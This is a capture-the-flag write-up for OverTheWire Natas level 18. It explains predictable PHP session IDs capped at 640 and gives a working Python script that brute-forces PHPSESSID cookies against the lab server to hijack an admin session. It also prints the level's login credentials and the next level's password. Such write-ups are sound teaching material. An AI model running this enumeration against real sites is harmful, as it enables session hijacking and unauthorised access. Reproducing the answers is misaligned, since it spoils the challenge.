# OverTheWire: Natas Level 18 -> Level 19 Writeup

## 1. Challenge Background & Analysis
The objective of this level is to authenticate as an administrator and retrieve the password for Natas Level 19. The application relies on a session mechanism to track users. Upon reviewing the provided source code, a critical architectural vulnerability is discovered in the session management logic:

```php
$maxid = 640;

function isValidID($id) {
    return is_numeric($id);
}
```

The session implementation suffers from **Weak Session Management**:
* **Bounded Session Space**: The maximum valid session identifier is constrained to a tiny, fixed integer limit (`$maxid = 640`).
* **Predictable Session Generation**: Instead of leveraging cryptographically secure, high-entropy pseudo-random tokens, the `PHPSESSID` values are purely sequential, predictable numbers ranging from 0 to 640.
* **Flawed Role Assignment**: When a session is initiated, the backend checks a backend data store to see if that specific numerical identifier possesses administrator rights (`$_SESSION["admin"] = 1`).

Because the entire session space is minuscule, an attacker does not need to crack passwords or bypass authentication forms. Instead, they can perform a **Session Hijacking / Credential Enumeration** attack to brute-force all possible session tokens until they hit the slot allocated to the active administrator session.

## 2. Solution Strategy & Exploitation

### Probe & Verification:
To confirm the vulnerability, we inspect the HTTP request cookies. We notice the server issues a standard `PHPSESSID` cookie, but its value is a simple integer. 

By manually changing `PHPSESSID` to arbitrary small numbers (e.g., `Cookie: PHPSESSID=1`), the page successfully renders without syntax errors but informs us that we are logged in as a regular user. Since there are only 641 total possibilities (0 through 640), this setup is a prime target for complete automated enumeration.

### Automation via Session Brute-Force:
We can automate the process by iterating through the session pool. We maintain a persistent HTTP connection using a `requests.Session()` object to minimize network overhead and systematically inject a custom `PHPSESSID` cookie into each sequential request. 

The server response behavior follows a clear Boolean state:
* **Regular Session (False)**: The response body contains default user output, indicating the session ID does not belong to an administrator.
* **Admin Session (True)**: The response body contains the string `"You are an admin"`, signaling a successful hijack of the administrative context.

### Python Automation Script:
We developed the following automated Python script to seamlessly sweep the session space and capture the admin session.

```python
import requests
from requests.auth import HTTPBasicAuth

## Iniatialize a persistent session and embeb basic authentication credentials
session = requests.Session()
session.auth = HTTPBasicAuth("natas18", "fDGn2A6Gsc0BUp3bZw0RNXpg0PZt40op")

## Iterating through all posibble session identifiers (0 to 640)
for i in range(0, 641):
    custom_cookie = {"PHPSESSID": str(i)}
    response = session.get("http://natas18.natas.labs.overthewire.org/index.php", cookies=custom_cookie)
    print(f"Trying PHPSESSID: {i}")

    ## Inspect the response content for the target admin signature
    if "You are an admin" in response.text:
        print(f"Found admin session with PHPSESSID: {i}")
        break
```

## 3. Flag / Final Result
* **Natas Level 19 Password**: `qvwtMqAcVSBlf7HE3sw9pljhqqPF9MMT`
